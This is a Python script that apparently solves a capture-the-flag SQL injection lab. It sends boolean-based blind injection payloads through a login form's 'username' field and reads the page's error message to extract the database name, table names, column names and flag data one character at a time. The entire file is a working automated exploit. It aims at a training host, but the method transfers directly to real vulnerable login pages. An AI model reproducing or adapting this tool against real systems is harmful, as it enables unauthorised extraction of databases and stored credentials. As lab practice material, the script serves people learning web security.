import requests
from bs4 import BeautifulSoup

def PostWebPage(url,message):
    r=requests.post(url=url,data=message)
    r.encoding=r.apparent_encoding
    Page=r.text
    soup=BeautifulSoup(Page,"html.parser")
    return soup


def getDBLength(url):
    print("{:-^20}".format("正在计算数据库名字的长度"))
    length=1
    Postinformation={"username":"length(database())={} #".format(length)}
    result=PostWebPage(url,Postinformation)
    # print(result.find_all("h3"))
    try:
        while result.find_all("font")[0].text=="账号密码错误":
            length+=1
            Postinformation = {"username": "1' or length(database())={} #".format(length)}
            result=PostWebPage(url,Postinformation)
    except:
        return "数据库的长度为:{}".format(length)
# print(getDBLength("http://injectx1.lab.aqlab.cn:81/Pass-12/index.php"))


def getDBname(url,length):
    # print("**********************")
    # print("{:-^20}".format("正在爆破数据库名"))
    DBname=""
    for i in range(1,length+1):
        for word in "abcdefghijklmnopqrstuvwxyz123456789,":
            PostDict={"username":"1' or substr(database(),{},1)=\'{}\' #".format(i,word)}
            result=PostWebPage(url,PostDict)
            try:
                if result.find_all("font")[0].text=="账号密码错误":
                    pass

                    # print("{} is Wrong".format(word))
            except:
                DBname+=word
                break
    return "数据库的名字是:{}".format(DBname)

def getTableName(url):
    TableName=""

    for i in range(1,30):
        for word in "abcdefghijklmnopqrstuvwxyz123456789,":
            print(word)
            PostDict={"username":"1' or substr((select group_concat(table_name) from information_schema.tables " \
                                 "where table_schema=database() limit 0,1),{},1)='{}' #".format(i,word)}
            result=PostWebPage(url,PostDict)

            try:
                if result.find_all("font")[0].text=="账号密码错误":
                    pass
            except:
                print("Catch:{}".format(i))
                TableName+=word

    return "数据库中的表为{}".format(TableName)

# print(getTableName("http://injectx1.lab.aqlab.cn:81/Pass-12/index.php"))

def getColumnName(url,tableName):
    ColumnName=""
    for i in range(1,10):
        for word in "abcdefghijklmnopqrstuvwxyz,":
            # print(word)
            PostDict={"username":"1' or substr((select group_concat(column_name) from information_schema.columns  "\
                    "where table_schema=database() and table_name='{}' limit 0,1),{},1)='{}' #".format(tableName,i,word)}
            result=PostWebPage(url,PostDict)
            try:
                if result.find_all("font")[0].text=="账号密码错误":
                    pass
                    # print(PostDict)
            except:
                print("Catch:{}".format(i))
                ColumnName+=word

    return "{}中的字段分别为{}".format(tableName,ColumnName)

# print(getColumnName("http://injectx1.lab.aqlab.cn:81/Pass-12/index.php","loflag"))

def find_data(url,tablename,column):
    Data=""
    for i in range(1,55):
        for word in "abcdefghijklmnopqrstuwxyz!@#$%^&*()_-,":
            PostDict={"username":"1' or substr((select group_concat({}) from {}),{},1)='{}' #".format(column,tablename,i,word)}
            result=PostWebPage(url,PostDict)
            try:
                if result.find_all("font")[0].text == "账号密码错误":
                    pass
                    # print(PostDict)
            except:
                print("Catch:{}".format(i))
                Data+=word
    return "{}字段的数据为{}".format(column,Data)


print(find_data("http://injectx1.lab.aqlab.cn:81/Pass-12/index.php","loflag","flaglo"))


